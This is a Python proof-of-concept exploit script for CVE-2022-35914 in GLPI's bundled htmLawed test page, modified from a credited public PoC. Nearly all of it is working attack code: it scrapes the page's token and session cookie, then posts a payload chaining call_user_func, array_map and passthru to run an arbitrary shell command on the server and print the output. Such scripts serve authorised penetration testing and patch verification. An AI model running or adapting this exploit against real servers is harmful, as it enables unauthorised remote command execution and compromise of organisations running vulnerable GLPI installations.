#!/usr/bin/python
# -*- coding: utf-8 -*-
#Original Script: https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py
#This method was hinted in this blog post by Mayfly: https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/

import argparse
from bs4 import BeautifulSoup
import requests
import sys
import re

requests.packages.urllib3.disable_warnings() 

RED = '\x1b[91m'
BLUE = '\033[94m'
GREEN = '\033[32m'
ENDC = '\033[0m'

def main():
    parser = argparse.ArgumentParser(description='CVE-2022-35914 - GLPI - Modified')
    parser.add_argument('-u', type=str, required=True, dest='url', help="URL to test")
    parser.add_argument('-c', type=str, required=False, dest='cmd', default="id", help="Command to launch (default: id)")
    parser.add_argument('--check', action="store_true", dest='check', help="Just check, no command execution.")
    parser.add_argument('--user-agent', type=str, required=False, default="Mozilla/5.0", dest='user_agent', help="Custom User-Agent")
    args = parser.parse_args()
    exploit(args.url, args.cmd, args.user_agent, args.check)

def exploit(url, cmd, user_agent, check):
    uri = "/vendor/htmlawed/htmlawed/htmLawedTest.php"
    headers = {'User-Agent': user_agent}

    session = requests.Session()
    response_part1 = session.get(str(url) + uri, verify=False, headers=headers)
    
    if response_part1.status_code != 200 or 'htmLawed' not in response_part1.text:
        fail()

    if check:
        print(GREEN + "[+] Server potentially vulnerable to CVE-2022-35914" + ENDC)
        sys.exit()

    token_value = BeautifulSoup(response_part1.text, 'html.parser').find_all(id='token')[0]['value']
    sid_value = session.cookies.get("sid")
    body = {"text": "call_user_func", "hhook": "array_map", "hexec": "passthru", "spec[0]": "", "spec[1]": cmd, "sid": sid_value}
    
    response_part2 = session.post(str(url) + uri, verify=False, headers=headers, data=body)
    parse(response_part2.text)

def parse(response):
    soup = BeautifulSoup(response, 'html.parser')
    marker_element = soup.find('a', onclick="javascript:toggle('inputR'); return false;")

    if marker_element:
        previous_element = marker_element.find_previous(string=True).strip()
        if previous_element:
            print(GREEN + "[+] Command output:" + ENDC)
            print(previous_element)
        else:
            print(RED + "[-] No command output found before the marker." + ENDC)
    else:
        print(RED + "[-] Marker not found in the response." + ENDC)

def fail():
    print(RED + "[-] Server not vulnerable to CVE-2022-35914" + ENDC)
    sys.exit()

if __name__ == '__main__':
    main()
